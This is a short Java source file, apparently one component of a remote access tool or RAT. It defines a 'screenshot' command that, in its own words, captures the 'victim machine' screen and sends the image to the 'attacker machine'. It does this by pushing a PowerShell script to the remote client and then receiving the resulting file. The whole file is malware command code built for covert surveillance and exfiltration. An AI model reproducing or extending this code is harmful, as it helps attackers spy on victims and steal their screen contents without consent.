package commands;

import java.io.File;
import java.io.IOException;

import connection.Connection;
import connection.Server;

public class ScreenShotCommand extends Command{

	public ScreenShotCommand() {
		super("screenshot", null, "takes a screenshot of the victim machine and sends it to the attacker machine");
	}

	@Override
	public void execute(Connection con, Server server) throws IOException, InterruptedException {
		con.simpleSend(_commandName);
		
		File screenShotScript = new File("resources/Take-ScreenShot.ps1");
		server.sendFile(screenShotScript);
		System.out.println("Taking the screenshot...");
		String response = con.receive();
		System.out.println(response);
		if(response.equals("Screenshot taken")) {
			server.receiveFile();
		}
	}

}
